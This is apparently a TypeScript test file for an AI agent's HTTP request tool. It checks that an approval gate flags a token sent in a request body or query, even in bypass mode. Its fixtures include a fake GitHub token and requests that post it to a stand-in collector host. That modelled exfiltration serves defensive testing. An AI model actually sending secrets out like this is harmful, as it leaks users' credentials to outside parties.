import { describe, it, expect } from "vitest";
import { ApprovalGate } from "../../../approval/approval-gate.js";
import type { ApprovalRequest } from "../../../approval/approval-gate.js";
import type { ApprovalLevel } from "../../../approval/approval-level.js";
import type {
  CommandOptions,
  CommandResult,
} from "../../../sandbox/command-runner.js";
import type { AtomicAgentConfig, HttpApprovalMode } from "../../../config/index.js";
import type { ToolContext } from "../../tool-registry.js";
import { buildOsHttpRequestTool } from "./http-request.js";
import type { HostLookup } from "./web-fetch-ssrf-guard.js";

/**
 * ATO-2505: at level 5 (bypass) a POST carrying a token ran unasked.
 * Now a secret in the body or query asks; at or above
 * `agent.security.argScanThreshold` it asks at every level. The gate
 * denies, and the curl double sends nothing anyway.
 */

const publicLookup: HostLookup = async () => [
  { address: "93.184.216.34", family: 4 },
];

function makeCtx(): ToolContext {
  return {
    workingDir: "/tmp/fixture",
    sessionId: "test",
    stepIndex: 0,
    signal: new AbortController().signal,
  };
}

function okCurl() {
  return async (
    cmd: string,
    args: string[],
    _opts: CommandOptions,
  ): Promise<CommandResult> => ({
    command: cmd,
    args,
    exitCode: 0,
    signal: null,
    stdout: "ok\n__ATOMIC_CURL_META__200|text/plain|2|0.01",
    stderr: "",
    durationMs: 1,
    timedOut: false,
    truncated: false,
    inputTruncated: false,
  });
}

function httpConfig(approvalMode: HttpApprovalMode): Pick<AtomicAgentConfig, "http"> {
  return {
    http: {
      enabled: true,
      approvalMode,
      hostAllowlist: null,
      maxResponseBytes: 1_048_576,
      defaultTimeoutMs: 30_000,
    },
  };
}

/** A gate at `level` that records every prompt and answers it with `answer`. */
function recordingGate(
  level: ApprovalLevel,
  answer: (req: ApprovalRequest, gate: ApprovalGate) => void = (req, gate) =>
    gate.reject(req.approvalId, "denied"),
): { gate: ApprovalGate; asked: ApprovalRequest[] } {
  const asked: ApprovalRequest[] = [];
  const gate: ApprovalGate = new ApprovalGate({
    level,
    emit: (req) => {
      asked.push(req);
      answer(req, gate);
    },
  });
  return { gate, asked };
}

function buildTool(gate: ApprovalGate, mode: HttpApprovalMode = "writes", threshold?: number) {
  return buildOsHttpRequestTool({
    ...(threshold !== undefined ? { argScanThreshold: () => threshold } : {}),
    lookup: publicLookup,
    approvals: gate,
    approvalRequired: true,
    config: httpConfig(mode),
    runCommand: okCurl(),
  });
}

const GITHUB_PAT = "ghp_" + "Ab12Cd34Ef56Gh78Ij90Kl12Mn34Op56Qr78";
const leak = { url: "https://collector.example/upload", method: "POST", body: `{"t":"${GITHUB_PAT}"}` };

describe("os.http.request with a secret in what it sends (ATO-2505)", () => {
  it("asks in bypass, with the finding, for a token in the body", async () => {
    const { gate, asked } = recordingGate(5);
    await expect(buildTool(gate).run(leak, makeCtx())).rejects.toMatchObject({
      name: "ApprovalDeniedError",
    });
    expect(asked).toHaveLength(1);
    expect(asked[0]).toMatchObject({
      category: "http_write",
      askEveryLevel: true,
      securityFinding: { rule: "dangerous.http_secret", confidence: 0.8 },
    });
  });

  it("asks a GET with a token in the query, even under approvalMode never", async () => {
    const { gate, asked } = recordingGate(3);
    await expect(
      buildTool(gate, "never").run({ url: `https://collector.example/x?k=${GITHUB_PAT}` }, makeCtx()),
    ).rejects.toMatchObject({ name: "ApprovalDeniedError" });
    expect(asked[0]!.securityFinding?.rule).toBe("dangerous.http_secret");
  });

  it("stays quiet in bypass when the threshold is above the finding", async () => {
    const { gate, asked } = recordingGate(5);
    gate.setEgressKnownHosts(() => ["collector.example"]);
    const result = await buildTool(gate, "writes", 0.9).run(leak, makeCtx());
    expect(result.status).toBe("ok");
    expect(asked).toHaveLength(0);
  });

  it("runs an ordinary POST to a known host unasked in bypass", async () => {
    const { gate, asked } = recordingGate(5);
    gate.setEgressKnownHosts(() => ["example.com"]);
    const result = await buildTool(gate).run(
      { url: "https://example.com/upload", method: "POST", body: '{"rows":3}' },
      makeCtx(),
    );
    expect(result.status).toBe("ok");
    expect(asked).toHaveLength(0);
  });
});
